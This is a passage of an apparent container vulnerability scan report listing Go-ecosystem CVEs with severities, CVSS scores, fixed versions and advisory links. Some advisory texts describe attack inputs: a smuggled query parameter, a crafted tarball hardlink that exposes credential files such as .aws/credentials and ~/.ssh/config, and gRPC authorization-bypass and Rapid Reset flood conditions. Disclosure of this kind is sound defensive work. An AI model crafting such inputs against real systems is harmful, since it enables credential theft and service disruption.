│     │      ├ Description     : ReverseProxy can forward queries containing parameters not visible to Rewrite
│     │      │                   functions. When used with a Rewrite function, or a Director function which
│     │      │                   parses query parameters, ReverseProxy sanitizes the forwarded request to
│     │      │                   remove query parameters which are not parsed by url.ParseQuery. ReverseProxy
│     │      │                   does not take ParseQuery's limit on the total number of query parameters
│     │      │                   (controlled by GODEBUG=urlmaxqueryparams=N) into account. This can permit
│     │      │                   ReverseProxy to forward a request containing a query parameter that is not
│     │      │                   visible to the Rewrite function. For example, the query
│     │      │                   "a1=x&a2=x&...&a10000=x&hidden=y" can forward the parameter "hidden=y" while
│     │      │                   hiding it from the proxy's Rewrite function. 
│     │      ├ Severity        : MEDIUM 
│     │      ├ VendorSeverity   ╭ amazon     : 3 
│     │      │                  ├ bitnami    : 2 
│     │      │                  ├ oracle-oval: 3 
│     │      │                  ├ photon     : 2 
│     │      │                  ╰ redhat     : 2 
│     │      ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N 
│     │      │                  │         ╰ V3Score : 5.3 
│     │      │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N 
│     │      │                            ╰ V3Score : 6.5 
│     │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-39825 
│     │      │                  ├ [1]: https://go.dev/cl/770541 
│     │      │                  ├ [2]: https://go.dev/issue/78948 
│     │      │                  ├ [3]: https://groups.google.com/g/golang-announce/c/qcCIEXso47M 
│     │      │                  ├ [4]: https://linux.oracle.com/cve/CVE-2026-39825.html 
│     │      │                  ├ [5]: https://linux.oracle.com/errata/ELSA-2026-22121.html 
│     │      │                  ├ [6]: https://nvd.nist.gov/vuln/detail/CVE-2026-39825 
│     │      │                  ├ [7]: https://pkg.go.dev/vuln/GO-2026-4976 
│     │      │                  ╰ [8]: https://www.cve.org/CVERecord?id=CVE-2026-39825 
│     │      ├ PublishedDate   : 2026-05-07T20:16:43.39Z 
│     │      ╰ LastModifiedDate: 2026-06-17T10:42:38.77Z 
│     ├ [39] ╭ VulnerabilityID : CVE-2026-39826 
│     │      ├ VendorIDs        ─ [0]: GO-2026-4980 
│     │      ├ PkgID           : stdlib@v1.24.13 
│     │      ├ PkgName         : stdlib 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.24.13 
│     │      │                  ╰ UID : ae746daa41f315ef 
│     │      ├ InstalledVersion: v1.24.13 
│     │      ├ FixedVersion    : 1.25.10, 1.26.3 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-39826 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:fcf4e0354eaca802b963b9f7b937863c67a2d34aace022835d31879f98324fb8 
│     │      ├ Title           : html/template: golang: html/template: Cross-site scripting due to incorrect
│     │      │                   script tag escaping 
│     │      ├ Description     : If a trusted template author were to write a <script> tag containing an empty
│     │      │                   'type' attribute or a 'type' attribute with an ASCII whitespace, the execution
│     │      │                    of the template would incorrectly escape any data passed into the <script>
│     │      │                   block. 
│     │      ├ Severity        : MEDIUM 
│     │      ├ CweIDs           ─ [0]: CWE-116 
│     │      ├ VendorSeverity   ╭ amazon     : 3 
│     │      │                  ├ bitnami    : 2 
│     │      │                  ├ oracle-oval: 3 
│     │      │                  ├ photon     : 2 
│     │      │                  ╰ redhat     : 2 
│     │      ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N 
│     │      │                  │         ╰ V3Score : 6.1 
│     │      │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N 
│     │      │                            ╰ V3Score : 5.4 
│     │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-39826 
│     │      │                  ├ [1]: https://go.dev/cl/771180 
│     │      │                  ├ [2]: https://go.dev/issue/78981 
│     │      │                  ├ [3]: https://groups.google.com/g/golang-announce/c/qcCIEXso47M 
│     │      │                  ├ [4]: https://linux.oracle.com/cve/CVE-2026-39826.html 
│     │      │                  ├ [5]: https://linux.oracle.com/errata/ELSA-2026-22121.html 
│     │      │                  ├ [6]: https://nvd.nist.gov/vuln/detail/CVE-2026-39826 
│     │      │                  ├ [7]: https://pkg.go.dev/vuln/GO-2026-4980 
│     │      │                  ╰ [8]: https://www.cve.org/CVERecord?id=CVE-2026-39826 
│     │      ├ PublishedDate   : 2026-05-07T20:16:43.49Z 
│     │      ╰ LastModifiedDate: 2026-06-17T10:42:38.923Z 
│     ├ [40] ╭ VulnerabilityID : CVE-2026-42505 
│     │      ├ VendorIDs        ─ [0]: GO-2026-5856 
│     │      ├ PkgID           : stdlib@v1.24.13 
│     │      ├ PkgName         : stdlib 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.24.13 
│     │      │                  ╰ UID : ae746daa41f315ef 
│     │      ├ InstalledVersion: v1.24.13 
│     │      ├ FixedVersion    : 1.25.12, 1.26.5, 1.27.0-rc.2 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42505 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:86470443668ac2b032bda48c317580398c8d2962eeac5655ad137e519fedcd9d 
│     │      ├ Title           : crypto/tls: golang: Go crypto/tls: Information disclosure in Encrypted Client
│     │      │                   Hello 
│     │      ├ Description     : Handshakes which used Encrypted Client Hello could be de-anonymized by a
│     │      │                   passive network observer due to a disclosure of pre-shared key identities in
│     │      │                   the unencrypted client hello. 
│     │      ├ Severity        : MEDIUM 
│     │      ├ CweIDs           ─ [0]: CWE-201 
│     │      ├ VendorSeverity   ╭ amazon : 2 
│     │      │                  ├ bitnami: 2 
│     │      │                  ╰ redhat : 2 
│     │      ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N 
│     │      │                  │         ╰ V3Score : 5.3 
│     │      │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N 
│     │      │                            ╰ V3Score : 5.3 
│     │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-42505 
│     │      │                  ├ [1]: https://go.dev/cl/775960 
│     │      │                  ├ [2]: https://go.dev/issue/79282 
│     │      │                  ├ [3]: https://groups.google.com/g/golang-announce/c/OrmQE_Yp5Sc 
│     │      │                  ├ [4]: https://nvd.nist.gov/vuln/detail/CVE-2026-42505 
│     │      │                  ├ [5]: https://pkg.go.dev/vuln/GO-2026-5856 
│     │      │                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2026-42505 
│     │      ├ PublishedDate   : 2026-07-08T17:17:21.497Z 
│     │      ╰ LastModifiedDate: 2026-07-13T17:05:36.303Z 
│     ├ [41] ╭ VulnerabilityID : CVE-2026-42507 
│     │      ├ VendorIDs        ─ [0]: GO-2026-5039 
│     │      ├ PkgID           : stdlib@v1.24.13 
│     │      ├ PkgName         : stdlib 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.24.13 
│     │      │                  ╰ UID : ae746daa41f315ef 
│     │      ├ InstalledVersion: v1.24.13 
│     │      ├ FixedVersion    : 1.25.11, 1.26.4 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42507 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:72e50a6490c35cd4788e8445271ed5fa60e181700815bee440d854cac70a3dbc 
│     │      ├ Title           : net/textproto: golang: Golang net/textproto: Misleading error messages via
│     │      │                   input injection 
│     │      ├ Description     : When returning errors, functions in the net/textproto package would include
│     │      │                   its input as part of the error. This might allow an attacker to inject
│     │      │                   misleading content to errors that are printed or logged. 
│     │      ├ Severity        : MEDIUM 
│     │      ├ VendorSeverity   ╭ alma       : 2 
│     │      │                  ├ amazon     : 2 
│     │      │                  ├ bitnami    : 2 
│     │      │                  ├ oracle-oval: 2 
│     │      │                  ├ redhat     : 2 
│     │      │                  ╰ rocky      : 2 
│     │      ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N 
│     │      │                  │         ╰ V3Score : 5.3 
│     │      │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N 
│     │      │                            ╰ V3Score : 5.3 
│     │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:29981 
│     │      │                  ├ [1] : https://access.redhat.com/security/cve/CVE-2026-42507 
│     │      │                  ├ [2] : https://bugzilla.redhat.com/2484205 
│     │      │                  ├ [3] : https://bugzilla.redhat.com/show_bug.cgi?id=2484205 
│     │      │                  ├ [4] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-42507 
│     │      │                  ├ [5] : https://errata.almalinux.org/9/ALSA-2026-29981.html 
│     │      │                  ├ [6] : https://errata.rockylinux.org/RLSA-2026:29980 
│     │      │                  ├ [7] : https://go.dev/cl/777060 
│     │      │                  ├ [8] : https://go.dev/issue/79346 
│     │      │                  ├ [9] : https://groups.google.com/g/golang-announce/c/tKs3rmcBcKw 
│     │      │                  ├ [10]: https://linux.oracle.com/cve/CVE-2026-42507.html 
│     │      │                  ├ [11]: https://linux.oracle.com/errata/ELSA-2026-29981.html 
│     │      │                  ├ [12]: https://nvd.nist.gov/vuln/detail/CVE-2026-42507 
│     │      │                  ├ [13]: https://pkg.go.dev/vuln/GO-2026-5039 
│     │      │                  ╰ [14]: https://www.cve.org/CVERecord?id=CVE-2026-42507 
│     │      ├ PublishedDate   : 2026-06-02T23:16:38.027Z 
│     │      ╰ LastModifiedDate: 2026-07-22T19:10:00.12Z 
│     ╰ [42] ╭ VulnerabilityID : CVE-2026-27139 
│            ├ VendorIDs        ─ [0]: GO-2026-4602 
│            ├ PkgID           : stdlib@v1.24.13 
│            ├ PkgName         : stdlib 
│            ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.24.13 
│            │                  ╰ UID : ae746daa41f315ef 
│            ├ InstalledVersion: v1.24.13 
│            ├ FixedVersion    : 1.25.8, 1.26.1 
│            ├ Status          : fixed 
│            ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│            │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│            ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-27139 
│            ├ DataSource       ╭ ID  : govulndb 
│            │                  ├ Name: The Go Vulnerability Database 
│            │                  ╰ URL : https://pkg.go.dev/vuln/ 
│            ├ Fingerprint     : sha256:c7ccd25dcc31643a196ce191e636a1916aff8990cbca42b413dacb91d7e03bad 
│            ├ Title           : os: FileInfo can escape from a Root in golang os module 
│            ├ Description     : On Unix platforms, when listing the contents of a directory using File.ReadDir
│            │                    or File.Readdir the returned FileInfo could reference a file outside of the
│            │                   Root in which the File was opened. The impact of this escape is limited to
│            │                   reading metadata provided by lstat from arbitrary locations on the filesystem
│            │                   without permitting reading or writing files outside the root. 
│            ├ Severity        : LOW 
│            ├ CweIDs           ─ [0]: CWE-22 
│            ├ VendorSeverity   ╭ amazon : 3 
│            │                  ├ azure  : 1 
│            │                  ├ bitnami: 1 
│            │                  ├ photon : 1 
│            │                  ╰ redhat : 1 
│            ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:L/I:N/A:N 
│            │                  │         ╰ V3Score : 2.5 
│            │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:L/I:N/A:N 
│            │                            ╰ V3Score : 2.5 
│            ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-27139 
│            │                  ├ [1]: https://go.dev/cl/749480 
│            │                  ├ [2]: https://go.dev/issue/77827 
│            │                  ├ [3]: https://groups.google.com/g/golang-announce/c/EdhZqrQ98hk 
│            │                  ├ [4]: https://nvd.nist.gov/vuln/detail/CVE-2026-27139 
│            │                  ├ [5]: https://pkg.go.dev/vuln/GO-2026-4602 
│            │                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2026-27139 
│            ├ PublishedDate   : 2026-03-06T22:16:01.07Z 
│            ╰ LastModifiedDate: 2026-06-17T10:26:44.23Z 
├ [4] ╭ [0] ╭ VulnerabilityID : GO-2026-5932 
│     │     ├ PkgID           : golang.org/x/crypto@v0.54.0 
│     │     ├ PkgName         : golang.org/x/crypto 
│     │     ├ PkgIdentifier    ╭ PURL: pkg:golang/golang.org/x/crypto@v0.54.0 
│     │     │                  ╰ UID : c527a3567c036841 
│     │     ├ InstalledVersion: v0.54.0 
│     │     ├ Status          : affected 
│     │     ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │     │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │     ├ DataSource       ╭ ID  : govulndb 
│     │     │                  ├ Name: The Go Vulnerability Database 
│     │     │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │     ├ Fingerprint     : sha256:6ce745da752559a48a60576c52f53bf3601322742f4aed430538f11d2aa98d7c 
│     │     ├ Title           : The golang.org/x/crypto/openpgp package is unmaintained, unsafe by design, and
│     │     │                   has known security issues 
│     │     ├ Description     : The golang.org/x/crypto/openpgp package is unsafe by design, has numerous known
│     │     │                    security issues, is not maintained, and should not be used.
│     │     │                   
│     │     │                   If you are required to interoperate with OpenPGP systems and need a maintained
│     │     │                   package, consider github.com/ProtonMail/go-crypto/openpgp which is a maintained
│     │     │                    fork that aims to be a drop-in replacement for this package. 
│     │     ├ Severity        : UNKNOWN 
│     │     ╰ References       ╭ [0]: https://go.dev/issue/44226 
│     │                        ╰ [1]: https://pkg.go.dev/vuln/GO-2026-5932 
│     ╰ [1] ╭ VulnerabilityID : CVE-2026-50163 
│           ├ VendorIDs        ─ [0]: GHSA-fxhp-mv3v-67qp 
│           ├ PkgID           : oras.land/oras-go/v2@v2.6.1 
│           ├ PkgName         : oras.land/oras-go/v2 
│           ├ PkgIdentifier    ╭ PURL: pkg:golang/oras.land/oras-go/v2@v2.6.1 
│           │                  ╰ UID : 2d707a2bb38acc69 
│           ├ InstalledVersion: v2.6.1 
│           ├ Status          : affected 
│           ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│           │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│           ├ SeveritySource  : ghsa 
│           ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-50163 
│           ├ DataSource       ╭ ID  : ghsa 
│           │                  ├ Name: GitHub Security Advisory Go 
│           │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago 
│           ├ Fingerprint     : sha256:5e3db64a9cedcb6f0593dfbbd20ab942fe5cb009dfc83d5afd0a31c4cb7af1cd 
│           ├ Title           : oras-go: Oras-go: Information disclosure and arbitrary file access via crafted
│           │                   tarball hardlinks 
│           ├ Description     : oras-go is a Go library for managing OCI artifacts. Prior to 2.6.2,
│           │                   ensureLinkPath in content/file/utils.go:262-275 validates a hardlink target
│           │                   relative to the extract base but returns the unresolved target, causing
│           │                   os.Link("victim.secret", "<extract_base>/payload.tar.gz/evil_cwd_link") to
│           │                   resolve header.Linkname against the process current working directory for a
│           │                   Typeflag=TypeLink entry such as Name=payload.tar.gz/evil_cwd_link and
│           │                   Linkname="victim.secret" with io.deis.oras.content.unpack: "true", which can
│           │                   expose or tamper with files such as .env, .git/config, .aws/credentials, and
│           │                   ~/.ssh/config. This issue is fixed in version 2.6.2. 
│           ├ Severity        : HIGH 
│           ├ CweIDs           ╭ [0]: CWE-22 
│           │                  ╰ [1]: CWE-59 
│           ├ VendorSeverity   ╭ ghsa  : 3 
│           │                  ╰ redhat: 2 
│           ├ CVSS             ╭ ghsa   ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:N 
│           │                  │        ╰ V3Score : 7.1 
│           │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:L/A:N 
│           │                           ╰ V3Score : 5.9 
│           ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-50163 
│           │                  ├ [1]: https://github.com/oras-project/oras-go 
│           │                  ├ [2]: https://github.com/oras-project/oras-go/commit/b11f777f8d405c5023c4b307cf
│           │                  │      dc5068dfc3d406 
│           │                  ├ [3]: https://github.com/oras-project/oras-go/commit/c463c654ab3ef34422c1764cd6
│           │                  │      19806cebf20451 
│           │                  ├ [4]: https://github.com/oras-project/oras-go/pull/1232 
│           │                  ├ [5]: https://github.com/oras-project/oras-go/releases/tag/v2.6.2 
│           │                  ├ [6]: https://github.com/oras-project/oras-go/security/advisories/GHSA-fxhp-mv3
│           │                  │      v-67qp 
│           │                  ├ [7]: https://nvd.nist.gov/vuln/detail/CVE-2026-50163 
│           │                  ╰ [8]: https://www.cve.org/CVERecord?id=CVE-2026-50163 
│           ├ PublishedDate   : 2026-07-17T20:17:23.943Z 
│           ╰ LastModifiedDate: 2026-07-23T18:02:00.793Z 
├ [5] ╭ [0] ╭ VulnerabilityID : GO-2026-5932 
│     │     ├ PkgID           : golang.org/x/crypto@v0.53.0 
│     │     ├ PkgName         : golang.org/x/crypto 
│     │     ├ PkgIdentifier    ╭ PURL: pkg:golang/golang.org/x/crypto@v0.53.0 
│     │     │                  ╰ UID : 2c4facc961c689eb 
│     │     ├ InstalledVersion: v0.53.0 
│     │     ├ Status          : affected 
│     │     ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │     │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │     ├ DataSource       ╭ ID  : govulndb 
│     │     │                  ├ Name: The Go Vulnerability Database 
│     │     │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │     ├ Fingerprint     : sha256:334e8b3cb5655ef569e635f13bc1663d645f0e645f46f132d0443652afb5c3e0 
│     │     ├ Title           : The golang.org/x/crypto/openpgp package is unmaintained, unsafe by design, and
│     │     │                   has known security issues 
│     │     ├ Description     : The golang.org/x/crypto/openpgp package is unsafe by design, has numerous known
│     │     │                    security issues, is not maintained, and should not be used.
│     │     │                   
│     │     │                   If you are required to interoperate with OpenPGP systems and need a maintained
│     │     │                   package, consider github.com/ProtonMail/go-crypto/openpgp which is a maintained
│     │     │                    fork that aims to be a drop-in replacement for this package. 
│     │     ├ Severity        : UNKNOWN 
│     │     ╰ References       ╭ [0]: https://go.dev/issue/44226 
│     │                        ╰ [1]: https://pkg.go.dev/vuln/GO-2026-5932 
│     ├ [1] ╭ VulnerabilityID : CVE-2026-56852 
│     │     ├ VendorIDs        ─ [0]: GO-2026-5970 
│     │     ├ PkgID           : golang.org/x/text@v0.38.0 
│     │     ├ PkgName         : golang.org/x/text 
│     │     ├ PkgIdentifier    ╭ PURL: pkg:golang/golang.org/x/text@v0.38.0 
│     │     │                  ╰ UID : 81b84793301e73fe 
│     │     ├ InstalledVersion: v0.38.0 
│     │     ├ FixedVersion    : 0.39.0 
│     │     ├ Status          : fixed 
│     │     ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │     │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-56852 
│     │     ├ DataSource       ╭ ID  : govulndb 
│     │     │                  ├ Name: The Go Vulnerability Database 
│     │     │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │     ├ Fingerprint     : sha256:7833ca547e02c4d2a394f510b43b9508f41c9f56b5d637a8c4d5fa98ea0d6662 
│     │     ├ Title           : A norm.Iter can enter an infinite loop when handling input containing  ... 
│     │     ├ Description     : A norm.Iter can enter an infinite loop when handling input containing invalid
│     │     │                   UTF-8 bytes. 
│     │     ├ Severity        : UNKNOWN 
│     │     ├ CweIDs           ─ [0]: CWE-835 
│     │     ├ References       ╭ [0]: https://go.dev/cl/794100 
│     │     │                  ├ [1]: https://go.dev/issue/80142 
│     │     │                  ╰ [2]: https://pkg.go.dev/vuln/GO-2026-5970 
│     │     ├ PublishedDate   : 2026-07-21T20:17:02.867Z 
│     │     ╰ LastModifiedDate: 2026-07-23T18:27:48.877Z 
│     ╰ [2] ╭ VulnerabilityID : GHSA-hrxh-6v49-42gf 
│           ├ PkgID           : google.golang.org/grpc@v1.81.1 
│           ├ PkgName         : google.golang.org/grpc 
│           ├ PkgIdentifier    ╭ PURL: pkg:golang/google.golang.org/grpc@v1.81.1 
│           │                  ╰ UID : 982e98b6c86be044 
│           ├ InstalledVersion: v1.81.1 
│           ├ FixedVersion    : 1.82.1 
│           ├ Status          : fixed 
│           ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│           │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│           ├ SeveritySource  : ghsa 
│           ├ PrimaryURL      : https://github.com/advisories/GHSA-hrxh-6v49-42gf 
│           ├ DataSource       ╭ ID  : ghsa 
│           │                  ├ Name: GitHub Security Advisory Go 
│           │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago 
│           ├ Fingerprint     : sha256:ba57710bb4eb3b287b8927e12f3ac1ea3edef40c230ead33fceef4a4d2179a6f 
│           ├ Title           : gRPC-Go: xDS RBAC and HTTP/2 Vulnerabilities 
│           ├ Description     : Multiple security vulnerabilities have been identified and addressed in grpc-go
│           │                    affecting the xDS RBAC authorization engine (internal/xds/rbac) and the HTTP/2
│           │                    transport server implementation (internal/transport). These vulnerabilities
│           │                   could result in:
│           │                   
│           │                   - Authorization Bypass (Fail-Open) when translating xDS RBAC policies
│           │                   containing `Metadata` or `RequestedServerName` fields.
│           │                   - Denial of Service (High CPU Consumption) due to an HTTP/2 Rapid Reset
│           │                   mitigation bypass during client-initiated stream resets.
│           │                   - Denial of Service (Server Panic) when parsing crafted xDS RBAC policies
│           │                   containing `NOT` rules around unsupported fields.
│           │                   ### Impact
│           │                   _What kind of vulnerability is it? Who is impacted?_
│           │                   #### xDS RBAC Authorization Bypass via `Metadata` & `RequestedServerName`
│           │                   matchers
│           │                   - Affected Component: xDS RBAC 
│           │                   - Impact: When building policy matchers for gRPC RBAC from xDS configurations,
│           │                   unsupported `permission` and `principal` rules (specifically `Metadata` and
│           │                   `RequestedServerName`) were silently ignored and treated as no-ops.
│           │                     - If an authorization policy relied purely on these matchers for access
│           │                   control, treating those rules as no-ops effectively removed the restrictions.
│           │                   - If these unsupported rules were nested inside logical `NOT` rules
│           │                   (`Permission_NotRule` / `Principal_NotId`) or multi-condition `OR/AND` rules,
│           │                   silently dropping them changed the boolean logic flow of the authorization
│           │                   engine.
│           │                   As a result, policy evaluation decisions could fail open, allowing unauthorized
│           │                    clients to access protected gRPC services or resources.
│           │                   #### HTTP/2 Rapid Reset Mitigation Bypass / Denial of Service via Stream
│           │                   Aborts
│           │                   - Affected Component: HTTP/2 transport
│           │                   - Impact: Earlier mitigations in grpc-go for HTTP/2 Rapid Reset only applied
│           │                   threshold checks to items that directly resulted in control frames being
│           │                   written back to the wire, such as `SETTINGS` ACKs or server-initiated
│           │                   `RST_STREAM`s.
│           │                   When a client initiated a rapid flood of stream creation (`HEADERS`)
│           │                   immediately followed by stream termination `RST_STREAM`, items queued up in the
│           │                    control buffer without counting against the transport response frame
│           │                   threshold. An attacker can repeatedly trigger this flood sequence to bypass
│           │                   reader blocking, resulting in high CPU usage, and Denial of Service (DoS).
│           │                   #### Denial of Service (Panic) in xDS RBAC Engine via Unsupported Fields inside
│           │                    NOT Rules
│           │                   - Impact: The xDS RBAC policy translators recursively generate matchers for
│           │                   nested rules. When a `NOT` rule wrapped an unsupported or unhandled field (such
│           │                    as `SourcedMetadata`), the recursive step returned an empty matcher. This
│           │                   could result in a runtime panic when the RBAC engine attempts to authorize an
│           │                   incoming request.
│           │                   An attacker or misconfigured/malicious xDS management server delivering an
│           │                   LDS/RDS update containing a `NOT` rule around an unhandled field causes the
│           │                   gRPC server process to crash immediately (CWE-248 / Denial of Service).
│           │                   ### Patches
│           │                   _Has the problem been patched? What versions should users upgrade to?_
│           │                   All three issues have been fixed in `master` and will be released in 1.82.1
│           │                   shortly.
│           │                   ### Workarounds
│           │                   _Is there a way for users to fix or remediate the vulnerability without
│           │                   upgrading?_
│           │                   If upgrading grpc-go immediately is not possible, apply the following
│           │                   workarounds based on your deployment architecture:
│           │                   * For xDS RBAC Vulnerabilities & Panics: Ensure that upstream xDS management
│           │                   servers do not push RBAC policies containing `Metadata`, `RequestedServerName`,
│           │                    or `NOT` rules wrapping unsupported fields (such as `SourcedMetadata`) to
│           │                   grpc-go servers.
│           │                   * For HTTP/2 Rapid Reset DOS: Configure upstream reverse proxies or load
│           │                   balancers (such as Envoy) with strict HTTP/2 `max_concurrent_streams` limits
│           │                   and active rate limiting on `RST_STREAM` frequency per connection.
│           │                   ### Severity
│           │                     | Vulnerability | Qualitative Severity | Approximate CVSS v3.1 Score |
│           │                   Primary Impact |
│           │                     | :--- | :--- | :--- | :--- |
│           │                     | **xDS RBAC Authorization Bypass** | **High** | `8.2` | Unauthorized Access
│           │                   / Fail-Open |
│           │                     | **HTTP/2 Rapid Reset DOS Bypass** | **High** | `7.5` | High CPU Consumption
│           │                    / Denial of Service |
│           │                     | **xDS RBAC Engine Server Panic** | **Medium** | `5.9` | Process Crash /
│           │                   Denial of Service | 
│           ├ Severity        : HIGH 
│           ├ VendorSeverity   ─ ghsa: 3 
│           ├ CVSS             ─ ghsa ╭ V40Vector: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:H/SC:N/SI:N/S
│           │                         │            A:N 
│           │                         ╰ V40Score : 8.8 
│           ├ References       ╭ [0]: https://github.com/grpc/grpc-go 
│           │                  ├ [1]: https://github.com/grpc/grpc-go/commit/4ea465d4ab98013f72a142fe0fc89c1977
│           │                  │      0b2935 
│           │                  ├ [2]: https://github.com/grpc/grpc-go/pull/9236 
│           │                  ├ [3]: https://github.com/grpc/grpc-go/releases/tag/v1.82.1 
│           │                  ╰ [4]: https://github.com/grpc/grpc-go/security/advisories/GHSA-hrxh-6v49-42gf 
│           ├ PublishedDate   : 2026-07-21T22:03:55Z 
│           ╰ LastModifiedDate: 2026-07-21T22:03:56Z 
├ [6] ╭ [0]  ╭ VulnerabilityID : CVE-2026-34040 
│     │      ├ VendorIDs        ─ [0]: GHSA-x744-4wpc-v9h2 
│     │      ├ PkgID           : github.com/docker/docker@v28.5.1+incompatible 
│     │      ├ PkgName         : github.com/docker/docker 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/github.com/docker/docker@v28.5.1%2Bincompatible 
│     │      │                  ╰ UID : 65d09eff9cd64aa5 
│     │      ├ InstalledVersion: v28.5.1+incompatible 
│     │      ├ FixedVersion    : 29.3.1 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ SeveritySource  : ghsa 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-34040 
│     │      ├ DataSource       ╭ ID  : ghsa 
│     │      │                  ├ Name: GitHub Security Advisory Go 
│     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago 
│     │      ├ Fingerprint     : sha256:c0e60c5dae56579c4381d30a5a64ba0fb1a3ff5701d2f84a174d630fb4ac80c3 
